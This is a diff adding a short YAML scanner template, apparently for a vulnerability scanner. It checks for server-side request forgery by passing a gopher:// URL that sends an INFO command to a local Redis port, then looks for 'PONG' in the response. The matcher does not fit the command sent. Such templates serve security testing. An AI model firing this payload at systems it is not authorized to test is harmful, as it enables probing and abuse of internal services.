@@ -1,0 +1,20 @@
+id: ssrf4-14
+name: 'SSRF scheme gopher via src'
+severity: high
+type: active
+tags:
+  - ssrf
+  - oob
+  - scheme
+description: 'Fetches gopher URL via src (verify manually)'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      src:
+        - 'gopher://127.0.0.1:6379/_INFO'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'PONG'
